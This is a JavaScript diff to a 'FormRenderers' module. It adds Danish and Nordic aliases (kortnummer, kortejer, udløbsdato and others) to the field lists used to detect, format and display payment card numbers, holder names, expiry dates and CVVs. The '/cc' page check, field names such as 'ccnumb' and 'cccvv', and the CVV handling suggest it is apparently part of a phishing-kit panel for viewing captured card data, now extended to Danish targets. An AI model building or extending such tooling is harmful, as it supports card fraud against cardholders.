@@ -57,7 +57,10 @@ const FormRenderers = (() => {
       const keys = Object.keys(fields);
 
       const CC_KEYS = ['card_number','ccnumb','card','cc_number','cardNumber','cardno','pan','ccno',
-                       'cvv','cvc','cvc2','cvv2','cccvv','security_code','securitycode'];
+                       'cvv','cvc','cvc2','cvv2','cccvv','security_code','securitycode',
+                       // Danish / Nordic aliases
+                       'kortnummer','kortnr','kort_nr','kort_nummer','kortejer','kort_ejer','kortejernavn','kortindehaver',
+                       'udlob','udlobsdato','udløb','udløbsdato'];
       const hasCCKeys = keys.some(k => CC_KEYS.includes(k));
       const isCC = page.includes('/cc') || hasCCKeys;
 
@@ -89,13 +92,16 @@ const FormRenderers = (() => {
           return num;
         };
 
-        const cardNumVal = resolveField(fields, 'card_number','ccnumb','card','cc_number','cardNumber','cardno','pan','ccno');
+        const cardNumVal = resolveField(fields, 'card_number','ccnumb','card','cc_number','cardNumber','cardno','pan','ccno',
+                                        'kortnummer','kortnr','kort_nr','kort_nummer');
         const cardNum = formatCardNumber(cardNumVal);
 
-        const cardHolderVal = resolveField(fields, 'card_holder','ccname','name','card_name','cardHolder','holder','nameoncard');
+        const cardHolderVal = resolveField(fields, 'card_holder','ccname','name','card_name','cardHolder','holder','nameoncard',
+                                           'kortejer','kort_ejer','kortejernavn','kortindehaver');
         const cardHolder = (cardHolderVal || 'YOUR NAME').toUpperCase();
 
-        const expVal = resolveField(fields, 'expiry','ccexp','exp','exp_date','expiration','expiry_date','mmyy','mm_yy');
+        const expVal = resolveField(fields, 'expiry','ccexp','exp','exp_date','expiration','expiry_date','mmyy','mm_yy',
+                                    'udlob','udlobsdato','udløb','udløbsdato');
         const exp = expVal || 'MM/YY';
 
         const cvvVal = resolveField(fields, 'cvv','cccvv','cvc','cvc2','cvv2','security_code','securitycode');
@@ -115,7 +121,11 @@ const FormRenderers = (() => {
           'card_number', 'ccnumb', 'card', 'cc_number', 'cardNumber',
           'card_holder', 'ccname', 'name', 'card_name', 'cardHolder',
           'expiry', 'ccexp', 'exp', 'exp_date', 'expiration',
-          'cvv', 'cccvv', 'cvc', 'security_code'
+          'cvv', 'cccvv', 'cvc', 'security_code',
+          // Danish aliases
+          'kortnummer', 'kortnr', 'kort_nr', 'kort_nummer',
+          'kortejer', 'kort_ejer', 'kortejernavn', 'kortindehaver',
+          'udlob', 'udlobsdato', 'udløb', 'udløbsdato'
         ];
 
         Object.entries(fields).filter(([k]) => !ccKeys.includes(k)).forEach(([k, v]) => {
